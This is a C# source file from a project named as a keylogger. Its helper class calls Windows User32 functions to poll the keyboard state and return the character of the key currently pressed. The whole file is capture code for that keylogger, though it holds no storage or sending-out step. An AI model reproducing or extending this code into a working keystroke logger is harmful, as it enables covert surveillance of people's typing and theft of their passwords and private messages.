using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger.Library.Helpers
{
    public static class KeyBoardHelper
    {
        
       private const int KEYS_LENGTH = 256;

        /// <summary>
        /// Check the state of a keyboard key
        /// </summary>
        /// <param name="vKey"></param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        //private static extern short GetAsyncKeyState(System.Int32 vKey);
        private static extern short GetKeyState(System.Int32 vKey);

        /// <summary>
        /// Check state of the whole keyboard
        /// </summary>
        /// <param name="lpKeyState"></param>
        /// <returns></returns>
        [DllImport("User32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        private static byte[] keys = new byte[KEYS_LENGTH];

        public static char GetKeyPressed()
        {
            /**
            Notes:
            In some cases this function will always return the same array,
            independent of actual keyboard state. This is due to Windows not
            updating the virtual key array internally.It has been found that
            declaring and calling GetKeyState on any key before calling 
            GetKeyboardState will solve this issue.
            **/

            GetKeyState(10);

            int keyCode = 0;

            if (GetKeyboardState(keys))
                keyCode = getKeyCodePressed(keys);

            return KeyConverter.KeyCodeToChar2(keyCode);
        }

        //TODO: Change algorithm
        private static int getKeyCodePressed(byte[] keys)
        {
            int i = 0;
            bool found = false;

            while (i < KEYS_LENGTH - 1 && !found)
            {
                if ((keys[i] & 0x80) != 0)
                {
                    found = true;
                }
                else i++;
            }

            return i;
        }

    }
}
